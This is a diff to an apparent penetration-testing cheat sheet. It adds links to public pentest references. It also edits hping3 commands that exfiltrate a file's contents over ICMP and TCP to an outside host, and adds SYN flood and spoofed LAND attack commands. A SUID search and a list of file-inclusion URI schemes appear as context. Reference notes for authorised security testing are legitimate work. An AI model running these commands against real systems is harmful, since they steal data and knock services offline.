@@ -1,3 +1,14 @@
+# +
+
+- https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/
+- https://snovvcrash.rocks/cheatsheets/
+- https://hausec.com/pentesting-cheatsheet/
+- http://www.vulnerabilityassessment.co.uk/Penetration%20Test.html
+- http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines
+- https://github.com/Orange-Cyberdefense/arsenal
+- https://github.com/enaqx/awesome-pentest
+- https://prune2000.github.io/tools/pentest/
+
 # racing, race-condition
 
 ```bash
@@ -117,10 +128,14 @@ find / -perm -u=s -type f 2>/dev/null
     - https://github.com/leonjza/dnsfilexfer
 - TCP
     ```bash
-    # ICMP
+    # ICMP (using file contents)
     hping3 -E foo.txt -1 -u -i 10 -d 1.2.3.4 95
-    # TCP ACK
-    hping3 -A 1.2.3.4 foo.txt
+    # TCP ACK (using file contents)
+    hping3 -E foo.txt -A 1.2.3.4
+    # SYN flood
+    hping3 -V -c 1000 -d 100 -p 8080 -S -- flood 1.2.3.4
+    # LAND attack
+    hping3 -V -c 1000 -d 100 -p 8080 -s 18080 -S -k -a 1.2.3.4 1.2.3.4
     ```
 - URI scheme
     - file, ftp, zlib, data, glob, phar, ssh2, rar, ogg, ftps, compress.zlib, compress.bzip2, zip
